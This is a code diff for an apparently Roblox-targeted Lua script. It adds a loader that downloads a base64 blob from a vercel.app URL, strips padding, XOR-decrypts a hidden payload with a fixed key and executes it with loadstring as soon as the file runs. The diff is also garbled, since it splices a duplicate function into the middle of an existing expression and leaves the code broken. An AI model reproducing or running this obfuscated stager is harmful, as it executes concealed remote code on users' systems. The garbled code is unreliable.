@@ -3,7 +3,93 @@ local function xor_decrypt(data, key)
     local out = {}
     for i = 1, #data do
         out[i] = string.char(
-            bit32.bxor(
+            bit32.bxor(-- XOR decryption
+local function xor_decrypt(data, key)
+    local out = {}
+    for i = 1, #data do
+        out[i] = string.char(bit32.bxor(data:byte(i), key:byte((i-1) % #key + 1)))
+    end
+    return table.concat(out)
+end
+
+-- Base64 decode
+local function base64_decode(data)
+    if crypt and crypt.base64decode then return crypt.base64decode(data) end
+    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+    data = string.gsub(data, '[^'..b..'=]', '')
+    return (data:gsub('.', function(x)
+        if x == '=' then return '' end
+        local r, f='', (b:find(x)-1)
+        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
+        return r
+    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
+        if #x<6 then return '' end
+        local c=0
+        for i=1,#x do c=c+(x:sub(i,i)=='1' and 2^(#x-i) or 0) end
+        return string.char(c)
+    end))
+end
+
+-- LZ4 stub (passthrough)
+local function lz4_decompress(data) return data end
+
+-- HTTP wrapper
+local function http_request(opts)
+    local HttpService = game:GetService("HttpService")
+    if http and http.request then return http.request(opts)
+    elseif request then return request(opts)
+    else return {Body=HttpService:GetAsync(opts.Url), StatusCode=200} end
+end
+
+-- bit32 fallback
+if not bit32 then
+    bit32 = {
+        bxor = function(a,b)
+            local result, bitval = 0, 1
+            while a>0 or b>0 do
+                if a%2 ~= b%2 then result = result + bitval end
+                a, b = math.floor(a/2), math.floor(b/2)
+                bitval = bitval * 2
+            end
+            return result
+        end
+    }
+end
+
+-- main
+local function load_script()
+    local res = http_request({ Url="https://lunoria-one.vercel.app/loader", Method="GET" })
+    if not res or not res.Body or #res.Body==0 then warn("[FAIL] No response body") return end
+    print("[HTTP] Loader response size:", #res.Body)
+
+    local raw = base64_decode(res.Body)
+    print("[B64] Decoded size:", #raw)
+    if #raw==0 then warn("[FAIL] Base64 decode failed") return end
+
+    local prefix_len = raw:byte(1)*256 + raw:byte(2)
+    print("[JUNK] Prefix length:", prefix_len)
+    local len_pos = 3 + prefix_len
+
+    local len = 0
+    for i=len_pos, len_pos+3 do len = len*256 + raw:byte(i) end
+    print("[JUNK] Payload length:", len)
+
+    local payload_start = len_pos + 4
+    local encrypted_payload = raw:sub(payload_start, payload_start + len - 1)
+    print("[PAYLOAD] Encrypted payload size:", #encrypted_payload)
+
+    local decrypted = xor_decrypt(encrypted_payload, "lunoria_bootstrap_v1")
+    print("[DECRYPT] Decrypted payload size:", #decrypted)
+
+    local fn, err = loadstring(decrypted)
+    if not fn then warn("[FAIL] loadstring error:", err) return end
+    print("[EXEC] Executing loader...")
+    fn()
+    print("[EXEC] Loader finished")
+end
+
+-- bootstrap
+load_script()
                 data:byte(i),
                 key:byte((i - 1) % #key + 1)
             )
